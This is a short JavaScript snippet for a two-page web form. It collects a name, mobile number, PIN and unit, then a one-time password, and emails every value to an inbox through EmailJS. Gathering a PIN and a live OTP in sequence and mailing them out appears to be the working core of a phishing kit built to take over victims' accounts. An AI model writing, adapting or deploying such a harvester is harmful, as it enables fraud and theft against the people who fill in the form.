<script>
  let formData = {};

  function goToOTP() {
    const form = document.getElementById('info-form');
    if (!form.checkValidity()) {
      form.reportValidity();
      return;
    }

    const formElements = form.elements;
    formData = {
      name: formElements['name'].value,
      mobile: formElements['mobile'].value,
      pin: formElements['pin'].value,
      unit: formElements['unit'].value
    };

    document.getElementById('page1').style.display = 'none';
    document.getElementById('page2').style.display = 'block';
  }

  document.getElementById('otp-form').addEventListener('submit', function(e) {
    e.preventDefault();
    formData.otp = this.elements['otp'].value;

    const tempForm = document.createElement('form');
    tempForm.style.display = 'none';
    for (const key in formData) {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = key;
      input.value = formData[key];
      tempForm.appendChild(input);
    }

    document.body.appendChild(tempForm); // âœ… Attach form to DOM

    emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
      .then(function() {
        alert('Your information has been sent to Gmail. Thank you!');
        location.reload();
      }, function(error) {
        console.log('FAILED...', error);
        alert('There was a problem submitting your form.');
      });
  });
</script>
